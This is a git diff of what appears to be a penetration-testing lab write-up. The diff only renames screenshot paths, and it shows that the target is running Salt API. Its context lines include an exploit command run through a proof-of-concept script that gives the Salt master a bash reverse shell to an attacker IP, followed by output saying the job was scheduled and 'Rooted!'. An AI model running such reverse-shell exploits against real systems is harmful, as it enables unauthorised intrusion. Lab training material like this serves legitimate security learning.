@@ -54,7 +54,7 @@ Port 8000 looked the most interesting since it was only returning JSON data. Vis
 
 When we view the headers, we can see that this is using a program called Salt API:
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
 
 There are some exploits for Salt here:
 
@@ -86,6 +86,6 @@ $ python3 poc.py --master 192.168.219.62 --exec 'bash -i >& /dev/tcp/192.168.45.
 [+] Successfully scheduled job: 20230705031527947368
 ```
 
-<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 Rooted!
